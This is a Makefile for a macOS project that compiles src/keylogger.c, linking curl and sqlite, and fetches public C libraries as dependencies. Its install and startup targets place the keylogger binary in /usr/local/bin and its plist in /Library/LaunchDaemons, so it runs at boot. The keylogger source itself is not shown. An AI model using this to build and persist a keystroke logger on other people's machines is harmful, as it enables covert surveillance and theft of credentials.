CC=$(shell command -v gcc)

FRAMEWORKS=-framework ApplicationServices -framework Carbon
FRAMEWORKS+=-framework Foundation -framework AppKit 

INCLUDE_PATHS=-I/usr/local/include
INCLUDE_PATHS+=-I../bash-loadable-wireguard/src
INCLUDE_PATHS+=-I./deps
INCLUDE_PATHS+=-I./include
INCLUDE_PATHS+=-I./src
INCLUDE_PATHS+=-I./include/fs
INCLUDE_PATHS+=-I./include/string
INCLUDE_PATHS+=-I./c_scriptexec/include
INCLUDE_PATHS+=-I./c_scriptexec/src
INCLUDE_PATHS+=-I./deps/c_fsio/include
INCLUDE_PATHS+=-I./deps/c_scriptexec/include
INCLUDE_PATHS+=-I./deps/c_string_buffer/include
INCLUDE_PATHS+=-I./deps/libconfuse/include

LIBRARY_PATHS=-L/usr/local/lib
LIBRARY_PATHS+=$(shell pkg-config libconfuse --libs --cflags)

LINKED_LIBRARIES=-lparson
LINKED_LIBRARIES+=-luv
LINKED_LIBRARIES+=-lpthread
LINKED_LIBRARIES+=-lm
LINKED_LIBRARIES+=-lcurl
LINKED_LIBRARIES+=-lsqlite3

SOURCES=src/keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist

INSTALLDIR=/usr/local/bin
BIN=bin
LOGS=./logs

PASSH=$(shell command -v passh)
BAT=bat --style=plain --force-colorization --theme="Monokai Extended Origin"

CFLAGS=$(FRAMEWORKS) $(INCLUDE_PATHS) $(LIBRARY_PATHS) $(LINKED_LIBRARIES)  -g
CC_CMD=$(CC) \
		$(CFLAGS) \
		$(SOURCES) \
		-o $(BIN)/$(EXECUTABLE)

cc:
	@$(PASSH) $(CC_CMD)

dev:
	@$(PASSH) -L logs/dev.log ./bin/dev.sh

cc-dev:
	@ansi --yellow --bg-black --italic "$(CC_CMD)"

cc-bat: cc-dev
	@make cc || { make cc | $(BAT); }
	@$(PASSH) -L $(LOGS)/$(EXECUTABLE).log $(BIN)/$(EXECUTABLE)

all: cc-bat

	
#	$(CC) parson.c $(CFLAGS) -o parson
#	$(CC) parser-main.c $(CFLAGS) -o parser-main

init:
	@mkdir -p deps bin

setup: init deps-install

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	cp $(PLIST) /Library/LaunchDaemons

clean: rm init

rm:
	rm -rf deps bin

tidy:
	./bin/tidy.sh

deps-parson:
	@[[ -d deps/parson ]] || git clone \
			https://github.com/kgabis/parson \
			deps/parson

deps-timequick:
	@[[ -d deps/timequick ]] || git clone \
			https://github.com/mbarbar/timequick \
			deps/timequick

deps-str-truncate:
	@[[ -d deps/str-truncate.c ]] || git clone \
			https://github.com/stephenmathieson/str-truncate.c \
			deps/str-truncate.c
deps-uv:
	@[[ -d deps/libuv ]] || git clone \
			https://github.com/libuv/libuv \
			deps/libuv
	@cd deps/libuv && cmake .
	@cd deps/libuv && make

deps-httpserver:
	@[[ -d deps/httpserver.h ]] || git clone https://github.com/jeremycw/httpserver.h deps/httpserver.h

deps-c_scriptexec:
	@[[ -d deps/c_scriptexec ]] || git clone https://github.com/sagiegurari/c_scriptexec deps/c_scriptexec

deps-confuse:
	@[[ -d deps/libconfuse ]] || git clone https://github.com/libconfuse/libconfuse deps/libconfuse

deps-clib:
	@clib install 

deps-c_string_buffer:
	@[[ -d deps/c_string_buffer ]] || git clone https://github.com/sagiegurari/c_string_buffer deps/c_string_buffer

deps-c_fsio:
	@[[ -d deps/c_fsio ]] || git clone https://github.com/sagiegurari/c_fsio deps/c_fsio
	@cd deps/c_fsio && ./build.sh

DEPS = \
	   deps-clib deps-c_fsio deps-c_string_buffer deps-confuse deps-c_scriptexec deps-httpserver \
	   deps-uv deps-timequick \
	   deps-parson \
	   deps-str-truncate

commit:
	@git commit -am 'Automated Commit'

push:
	@git push

git: tidy commit push

deps-install: $(DEPS)

